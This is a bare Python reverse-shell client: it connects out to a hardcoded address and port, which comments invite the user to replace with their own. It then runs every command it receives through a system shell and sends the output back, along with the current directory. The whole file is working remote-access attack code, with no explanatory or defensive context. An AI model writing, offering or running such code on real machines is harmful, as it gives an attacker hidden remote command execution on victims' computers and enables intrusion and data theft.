#!/usr/bin/python3
import os
import socket
import sys
import subprocess

def soc_create():
    global soc
    soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def soc_connect():
    global ip
    global port
    ip = '192.168.0.103'          #give your ip here
    port = 9090             #give your port here
    soc.connect((ip, port))

def exec_cmd():
    global soc
    while True:
        cmd_rec = soc.recv(1024)
        cmd_rec = cmd_rec.decode()
        if cmd_rec[:2] == 'cd':
            os.chdir(cmd_rec[3:])
        if len(cmd_rec) > 0:
            proc = subprocess.Popen(cmd_rec, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            cmd_out = proc.stdout.read() + proc.stderr.read()
            str_out = str(cmd_out, "utf-8") + str(os.getcwd()) + '>'
            cmd_enc = str_out.encode()
            soc.send(cmd_enc)
    s.close()

def main():
    soc_create()
    soc_connect()
    exec_cmd()

if __name__ == "__main__":
    main()
